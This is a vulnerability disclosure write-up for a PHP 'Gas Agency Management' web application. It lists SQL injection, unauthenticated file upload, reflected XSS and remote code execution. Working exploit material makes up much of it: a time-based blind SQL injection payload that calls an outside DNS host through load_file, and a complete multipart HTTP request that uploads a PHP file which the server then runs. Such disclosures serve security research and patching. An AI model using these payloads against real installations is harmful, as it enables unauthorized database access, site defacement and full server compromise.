## [Gas-Agency-Management-2022](https://www.sourcecodester.com/php/15586/gas-agency-management-system-project-php-free-download-source-code.html)

![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/mayuri_k/2022/Gas-Agency-Management-2022/Docs/Screenshot%202022-08-12%20153659.png)

## [Vendor](https://www.mayurik.com/#download_section)

![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/mayuri_k/2022/Gas-Agency-Management-2022/Docs/Screenshot%202022-08-12%20151745.png)

## Description:
The Gas Agency Management-2022 by Mayuri K suffers from multiple vulnerabilities, which means this project must be deprecated immediately!
1. - SQLi: the parameter username is vulnerable to time-based blind (query SLEEP) injection - not sanitizing well.
2. - Unauthenticated file upload - not sanitizing upload function - possible to upload .php extension files on photo section, for the customers.
3. - XSS-reflected in the section adds customer in address function.
4. - Web shell file upload - unauthenticated extension file upload, in this case, is PHP web shell uploader. After this, the malicious user
     can execute the already uploaded file remotely, and he can destroy completely this flawed system.
5. - STATUS: For termination of the project. 

[+]Payloads:

```mysql
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=mxiusQzi'+(select load_file('\\\\alzg6yrkl2xieezgaz9zqnya91fu3lw9ncb4yumj.tupaciganka.com\\jfe'))+'' AND (SELECT 9964 FROM (SELECT(SLEEP(5)))bVfa)-- FygL&password=r8H!r2a!U2&login=
---
```
[+]Unauthenticated Upload:
- - - in the video:
https://streamable.com/opqz3n
![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/mayuri_k/2022/Gas-Agency-Management-2022/Docs/Screenshot%202022-08-12%20153659.png)

[+]XSS-Reflected:
- - - in the video:
https://streamable.com/opqz3n
![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/mayuri_k/2022/Gas-Agency-Management-2022/Docs/Screenshot%202022-08-12%20153754.png)

[+]RCE:
- - - in the video:
https://streamable.com/opqz3n
![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/mayuri_k/2022/Gas-Agency-Management-2022/Docs/Screenshot%202022-08-12%20153729.png)

### Up 2024, there is no fixed issue: File Upload - RCE
```PHP
POST /gasmark/gasmark/php_action/createclient.php HTTP/1.1
Host: pwnedhost.com
Cookie: PHPSESSID=1afinf22p9snl2nai24g29duuc
Content-Length: 1063
Cache-Control: max-age=0
Sec-Ch-Ua: "Not(A:Brand";v="24", "Chromium";v="122"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://pwnedhost.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryb4PfTJ8hUNsEjxtB
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://pwnedhost.com/gasmark/gasmark/add_client.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
Connection: close

------WebKitFormBoundaryb4PfTJ8hUNsEjxtB
Content-Disposition: form-data; name="currnt_date"


------WebKitFormBoundaryb4PfTJ8hUNsEjxtB
Content-Disposition: form-data; name="name"

pwned
------WebKitFormBoundaryb4PfTJ8hUNsEjxtB
Content-Disposition: form-data; name="gender"

Female
------WebKitFormBoundaryb4PfTJ8hUNsEjxtB
Content-Disposition: form-data; name="mob_no"

1234
------WebKitFormBoundaryb4PfTJ8hUNsEjxtB
Content-Disposition: form-data; name="reffering"

1234
------WebKitFormBoundaryb4PfTJ8hUNsEjxtB
Content-Disposition: form-data; name="address"

1234
------WebKitFormBoundaryb4PfTJ8hUNsEjxtB
Content-Disposition: form-data; name="productImage"; filename="1nsi1deyou.php"
Content-Type: application/octet-stream

<?php
// by nu11secur1ty - 2023
$fh = fopen('test.html', 'a');
fwrite($fh, '<h1>Hello, you are hacked by Fileupload and RCE!</h1>');
fclose($fh);

//nlink('test.html');
?>

------WebKitFormBoundaryb4PfTJ8hUNsEjxtB
Content-Disposition: form-data; name="create"


------WebKitFormBoundaryb4PfTJ8hUNsEjxtB--
```

## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/mayuri_k/2022/Gas-Agency-Management-2022)

## Proof and Exploit:
[href](https://www.nu11secur1ty.com/2022/08/gasagency-sqli-bypass-authentication.html)
- 2024  there is no fixed issue
[2024](https://www.nu11secur1ty.com/2024/03/gasmark-pro-10-file-upload-rce.html)
